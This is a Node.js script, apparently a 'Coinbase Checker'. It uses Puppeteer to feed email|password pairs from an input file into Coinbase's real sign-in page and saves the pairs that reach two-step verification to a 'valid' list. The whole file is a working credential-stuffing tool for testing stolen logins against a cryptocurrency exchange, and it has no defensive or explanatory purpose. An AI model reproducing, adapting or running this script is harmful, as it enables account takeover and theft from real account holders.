const readlineSync = require('readline-sync');
const puppeteer = require('puppeteer');
var random_name = require('node-random-name');
const fs = require('fs');
const delay = require('delay');
const S = require('string'  );
const { error, Console } = require('console');
const { type } = require('os');
var no = 1;
var moment = require("moment");
var figlet = require('figlet');
var chalk = require('chalk');
const { visible } = require('chalk');

(async () => {
    console.log(
        chalk.white(
        figlet.textSync('Coinbase Checker', { horizontalLayout: 'fitted' })
     )
    );

    var aww = readlineSync.question('Input File Akun : ');

    console.log('\n');
    const read = fs.readFileSync(aww, 'UTF-8');
    const list = read.split(/\r?\n/);
    for (var i = 0; i < list.length; i++) {
        var email = list[i].split('|')[0];
        var password = list[i].split('|')[1];

    const $options = { waitUntil: 'networkidle2' };
    const browser = await puppeteer.launch({ headless: true });
    const page = await browser.newPage();

    await page.goto('https://www.coinbase.com/oauth/authorize/oauth_signin?client_id=2d06b9a69c15e183856ff52c250281f6d93f9abef819921eac0d8647bb2b61f9&meta%5Baccount%5D=all&redirect_uri=https%3A%2F%2Fpro.coinbase.com%2Foauth_redirect&response_type=code&scope=user+balance&state=b207e008-b6a8-4c5e-c216-12e1631e3a62', $options);


    await page.waitForSelector('#email')
    const emailField = await page.$('#email')
    await emailField.type(email)

    await page.waitForSelector('#password')
    const passwordField = await page.$('#password')
    await passwordField.type(password)

    await delay(5000)
    const button = await page.$('#signin_button')
    await button.click()

    try {
        await page.waitForSelector('div[class="alert alert-error alert-danger"]', {visible:true, timeout:5000})
        var info = await page.evaluate(() => {
            return document.querySelector('div[class="alert alert-error alert-danger"]').innerText;
        })
        var error1  = info.match('Invalid(.*)', 'signing in');
        var error2  = info.match('Too(.*)');
        if(error1) {
        console.log('[' + no + ']', email + '|' + password + ' Information : '+error1+'')
        } else {
        console.log('[' + no + ']', email + '|' + password + ' Information : '+error2+'')
        }
    } catch (err){

    }

    if (page.url().includes('signin_step_two')) {
        console.log('[' + no + ']', email + '|' + password + ' Information : Successfully Login')
        fs.appendFileSync("coinbaseavalid.txt", email + '|' + password + 'Information : Successfully Login' + '\n');
    }
    no++
    await browser.close()
}
})();